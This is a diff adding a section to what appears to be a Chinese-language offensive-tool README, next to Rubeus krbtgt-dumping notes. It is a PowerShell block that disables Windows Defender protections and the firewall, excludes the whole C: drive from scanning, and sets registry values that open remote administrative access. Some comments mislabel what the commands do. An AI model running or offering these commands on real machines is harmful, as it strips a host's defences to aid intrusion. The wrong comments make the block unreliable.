@@ -240,6 +240,35 @@ Rubeus.exe dump /luid:0x7049f /service:krbtgt
 * 项目用处：激活 ms 各项软件
 
 ---
+# 14.close.txt
+* 项目用处：ps 命令关闭win 所有防御措施，实时防护需要组策略关闭，否则为临时关闭状态
+```
+# 禁用 Windows Defender 实时保护
+Set-MpPreference -DisableRealtimeMonitoring $true
+# 云保护等级设置为 "高"，相当于禁用云保护
+Set-MpPreference -CloudBlockLevel High
+# 禁用 Windows Defender 网络检查
+Set-MpPreference -DisableIOAVProtection $true
+# 禁用 Windows Defender 自动扫描
+Set-MpPreference -DisableArchiveScanning $true
+# 禁用 Windows Defender 行为监控
+Set-MpPreference -DisableBehaviorMonitoring $true
+# 禁用 Windows 防火墙
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+#添加排除目录
+Add-MpPreference -ExclusionPath 'C:\'
+
+# 禁用 UAC
+New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -value 0
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord
+
+
+
+gpedit.msc
+计算机配置 > 管理模板 > Windows 组件 > Windows Defender 防病毒
+关闭实时保护>启用
+```
+---
 
 
 
